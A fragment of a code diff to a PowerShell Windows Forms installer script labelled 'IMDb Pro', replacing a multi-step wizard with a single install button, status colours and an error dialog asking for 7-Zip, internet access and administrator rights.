+            Invoke-Item $installPath
+        }
     }
     catch {
-        $statusLabel.Text = "Installation failed: $($_.Exception.Message)"
-        $statusLabel.ForeColor = [System.Drawing.Color]::Red
-        $cancelButton.Enabled = $true
-        $cancelButton.Text = "Close"
+        # Error handling
+        Update-Progress "Installation failed!" 0
+        
+        $installButton.Text = "TRY AGAIN"
+        $installButton.BackColor = [System.Drawing.Color]::FromArgb(244, 67, 54)
+        $installButton.Enabled = $true
+        
+        [System.Windows.Forms.MessageBox]::Show(
+            "Installation failed!`n`n" +
+            "Error: $($_.Exception.Message)`n`n" +
+            "Make sure:`n" +
+            "• You have 7-Zip installed`n" +
+            "• Internet connection is working`n" +
+            "• Running as Administrator",
+            "Installation Error",
+            [System.Windows.Forms.MessageBoxButtons]::OK,
+            [System.Windows.Forms.MessageBoxIcon]::Error
+        )
     }
 }
 
-function Update-Status {
-    param([string]$Message, [int]$Progress)
-    
-    $statusLabel.Text = $Message
-    $progressBar.Value = $Progress
-    [System.Windows.Forms.Application]::DoEvents()
-    Start-Sleep -Milliseconds 500
-}
-
-# Button Events
- $nextButton.Add_Click({
-    $currentStep++
-    Show-Step -Step $currentStep
+# Install button click
+$installButton.Add_Click({
+    $installButton.Enabled = $false
+    $installButton.Text = "INSTALLING..."
+    $installButton.BackColor = [System.Drawing.Color]::FromArgb(255, 152, 0)
+    Start-Installation
 })
-
- $backButton.Add_Click({
-    $currentStep--
-    Show-Step -Step $currentStep
-})
-
- $agreeCheckbox.Add_CheckedChanged({
-    $nextButton.Enabled = $agreeCheckbox.Checked
-})
-
- $finishButton.Add_Click({
-    $mainForm.Close()
-})
-
- $cancelButton.Add_Click({
-    $result = [System.Windows.Forms.MessageBox]::Show(
-        "Are you sure you want to cancel IMDb Pro installation?",
-        "Cancel Installation",
-        [System.Windows.Forms.MessageBoxButtons]::YesNo,
-        [System.Windows.Forms.MessageBoxIcon]::Question
-    )
-    
-    if ($result -eq [System.Windows.Forms.DialogResult]::Yes) {
-        $mainForm.Close()
-    }
-})
-
-# Show initial step
-Show-Step -Step 1
 
 # Show form
 [System.Windows.Forms.Application]::EnableVisualStyles()
- $mainForm.ShowDialog() | Out-Null
+$mainForm.ShowDialog() | Out-Null
